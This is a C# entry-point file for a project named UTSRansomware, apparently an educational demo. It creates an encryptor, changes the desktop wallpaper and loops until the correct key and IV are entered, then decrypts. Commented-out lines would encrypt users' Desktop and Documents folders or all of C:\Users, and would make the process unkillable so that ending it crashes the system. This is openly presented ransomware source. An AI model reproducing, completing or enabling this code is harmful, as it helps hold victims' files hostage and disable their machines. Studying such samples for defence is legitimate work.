namespace UTSRansomware
{
    internal class Program
    {
        // Entry point of program
        static void Main(string[] args)
        {

            // Will mark the process as critical causing BSOD if terminated

            //Utils.makeProcessUnkillable();

            /* 
             * Creates new encryptor class and and encrypt "special" directories e.g Desktop, Documents, etc
             * Line below is commented out so running it doesn't encrypt your computer
             * Uncomment it to see it function
             */
            Encryptor encryptor = new Encryptor();

            // Sets desktop background to specifc image
            Utils.SetDesktopBackground();

            // encryptor.EncryptSpecialDirectories();

            // Will recursively encrypt all files, currently throws a lot of errors
            //encryptor.EncryptDirectory(@"C:\Users");

            Console.WriteLine(Directory.GetCurrentDirectory());


            /* 
             * Starts decryption prcoess after correct key and iv are entered
             * Key and IV are saved to desktop in text file
             */
            while (true)
            {
                if (Utils.ValidateKeyAndIv(encryptor.key, encryptor.iv))
                {
                    Decryptor decryptor = new Decryptor(encryptor.key, encryptor.iv);
                    decryptor.DecryptSpecialDirectories();
                    Console.ReadKey();
                    Environment.Exit(0);
                }
            }
        }
    }
}